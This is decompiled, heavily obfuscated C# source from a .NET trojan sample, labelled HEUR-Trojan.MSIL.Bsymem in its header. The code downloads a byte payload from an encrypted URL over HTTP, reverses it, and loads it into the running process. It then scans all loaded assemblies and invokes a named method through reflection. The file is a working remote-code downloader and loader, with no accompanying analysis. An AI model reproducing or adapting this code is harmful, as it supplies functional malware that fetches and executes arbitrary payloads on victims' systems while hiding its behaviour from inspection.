// Decompiled with JetBrains decompiler
// Type: Ocbxkq.Data
// Assembly: another, Version=4.0.24.1356, Culture=neutral, PublicKeyToken=null
// MVID: ACF91E61-9A67-9F6D-6F49-83C0D7ACC19C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Bsymem.gen-140f30b079e31bbfda2e561f3a3e7af42291a167bdd5d8ebeee3a87bc3cc83e6.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;

namespace Ocbxkq
{
  public static class Data
  {
    internal static Delegate \uE000;

    public static void Another()
    {
label_8:
      int num1 = \uE009.\uE004(100);
      int num2 = -2;
label_2:
      List<byte> byteList;
      byte[] numArray;
      int length;
      while (true)
      {
        num2 ^= 99;
label_4:
        int num3 = \uE009.\uE004(103);
        while (true)
        {
          switch ((num3 ^ 101) + 99)
          {
            case 0:
              switch (num2 + 101)
              {
                case 0:
                  goto label_8;
                case 1:
                  switch (num1 + 99)
                  {
                    case 0:
                      byteList = new List<byte>();
                      num1 = -12;
                      goto label_1;
                    case 1:
                      length = numArray.Length;
                      num1 = -54;
                      goto label_1;
                    case 2:
                      numArray = Data.\uE002(\uE008.\uE000(21596));
                      num1 = -9;
                      goto label_1;
                    case 3:
                      goto label_15;
                    default:
                      goto label_10;
                  }
                case 2:
label_1:
                  num1 ^= 106;
                  goto label_7;
                default:
                  num3 = -5;
                  continue;
              }
            case 1:
label_7:
              num2 = \uE009.\uE004(101);
              num3 = -6;
              continue;
            case 2:
              goto label_2;
            default:
              goto label_4;
          }
        }
label_10:
        num2 = -8;
      }
label_15:
      while ((length-- <= 0 ? 0 : 1) != 0)
        byteList.Add(numArray[length]);
      AppDomain.CurrentDomain.Load(byteList.ToArray());
    }

    internal static void \uE000()
    {
label_2:
      int num1 = \uE009.\uE004(109);
      while (true)
      {
        int index1;
        Assembly[] assemblies;
        Assembly assembly;
        switch (num1 ^ 112)
        {
          case 115:
            index1 = 0;
            num1 = 4;
            continue;
          case 116:
            if (index1 != 0)
            {
              num1 = 7;
              continue;
            }
            break;
          case 117:
            assemblies = AppDomain.CurrentDomain.GetAssemblies();
            num1 = 3;
            continue;
          case 118:
            num1 = 5;
            continue;
          case 119:
label_8:
            assembly = assemblies[index1];
            num1 = 8;
            continue;
          case 120:
label_10:
            int num2 = \uE009.\uE004(107);
            while (true)
            {
              int index2;
              Type[] types;
              Type type;
              switch ((num2 ^ 111) + 107)
              {
                case 0:
                  if (index2 != 0)
                  {
                    num2 = -11;
                    continue;
                  }
                  break;
                case 1:
                  index2 = 0;
                  num2 = -6;
                  continue;
                case 2:
                  num2 = -10;
                  continue;
                case 3:
                  num2 = -8;
                  continue;
                case 4:
                  types = assembly.GetTypes();
                  num2 = \uE009.\uE004(116);
                  continue;
                case 5:
label_17:
                  type = types[index2];
                  num2 = -12;
                  continue;
                case 6:
                  try
                  {
                    MethodInfo method = type.GetMethod(\uE008.\uE000(21739));
label_20:
                    int num3 = \uE009.\uE004(99);
                    while (true)
                    {
                      switch (num3 ^ 110)
                      {
                        case 111:
                          Data.\uE000 = Delegate.CreateDelegate(typeof (Action), (object) null, method);
                          num3 = \uE009.\uE004(114);
                          continue;
                        case 112:
                          num3 = 28;
                          continue;
                        case 113:
                          Data.\uE000.DynamicInvoke();
                          num3 = 30;
                          continue;
                        case 114:
                          goto label_25;
                        default:
                          goto label_20;
                      }
                    }
                  }
                  catch
                  {
                  }
label_25:
                  ++index2;
                  break;
                default:
                  goto label_10;
              }
              if (index2 < types.Length)
                goto label_17;
              else
                break;
            }
            ++index1;
            break;
          default:
            goto label_2;
        }
        if (index1 < assemblies.Length)
          goto label_8;
        else
          break;
      }
    }

    internal static Assembly \uE001(byte[] _param0)
    {
label_10:
      int num1 = \uE009.\uE004(99);
      int num2 = -5;
label_2:
      Assembly assembly;
      while (true)
      {
        num2 ^= 109;
label_4:
        int num3 = \uE009.\uE004(113);
        while (true)
        {
          switch (num3 ^ 111)
          {
            case 110:
label_5:
              num2 = \uE009.\uE004(116);
              num3 = 31;
              continue;
            case 111:
              switch (num2 + 108)
              {
                case 0:
                  switch (num1)
                  {
                    case 114:
                    case 116:
                      goto label_12;
                    case 115:
                      assembly = AppDomain.CurrentDomain.Load(_param0);
                      num1 = 0;
                      goto label_1;
                    default:
                      goto label_9;
                  }
                case 1:
                  goto label_10;
                case 2:
label_1:
                  num1 ^= 114;
                  goto label_5;
                default:
                  num3 = 1;
                  continue;
              }
            case 112:
              goto label_2;
            default:
              goto label_4;
          }
        }
label_9:
        num2 = -8;
      }
label_12:
      return assembly;
    }

    internal static byte[] \uE002(string _param0)
    {
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
      }
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param0);
label_9:
      int num1 = \uE010.\uE023(123);
      int num2 = -16;
      while (true)
      {
        switch ((num2 ^ 121) + 121)
        {
          case 0:
            switch (num1)
            {
              case 117:
                httpWebRequest.Method = \uE008.\uE000(21759);
                num1 = 14;
                goto label_4;
              case 118:
                num1 = 15;
                goto label_4;
              case 119:
                goto label_12;
              default:
                num2 = -15;
                continue;
            }
          case 1:
            goto label_9;
          case 2:
label_4:
            num1 ^= 120;
            break;
        }
        num2 = \uE010.\uE023(118);
      }
label_12:
      MemoryStream memoryStream = new MemoryStream();
      try
      {
        HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
        try
        {
          Stream responseStream = response.GetResponseStream();
          try
          {
            byte[] buffer = new byte[1024];
label_17:
            int num3;
            do
            {
              int num4 = \uE010.\uE023(121);
              int count;
              bool flag;
              while (true)
              {
                switch (num4 ^ 120)
                {
                  case 119:
                    num4 = 1;
                    continue;
                  case 120:
                    memoryStream.Write(buffer, 0, count);
                    num4 = \uE010.\uE023(126);
                    continue;
                  case 121:
                    num4 = 2;
                    continue;
                  case 122:
                    flag = count > 0;
                    num4 = 4;
                    continue;
                  case 123:
                    count = responseStream.Read(buffer, 0, 1024);
                    num4 = 0;
                    continue;
                  case 124:
                    if (flag)
                    {
                      num4 = 5;
                      continue;
                    }
                    goto label_26;
                  case 125:
                    goto label_25;
                  default:
                    goto label_17;
                }
              }
label_25:
              num3 = 1;
              goto label_27;
label_26:
              num3 = 0;
label_27:;
            }
            while (num3 != 0);
            return memoryStream.ToArray();
          }
          finally
          {
            if ((responseStream == null ? 1 : 0) == 0)
              responseStream.Dispose();
          }
        }
        finally
        {
          if ((response == null ? 1 : 0) == 0)
            response.Dispose();
        }
      }
      finally
      {
        if ((memoryStream == null ? 1 : 0) == 0)
          memoryStream.Dispose();
      }
    }
  }
}
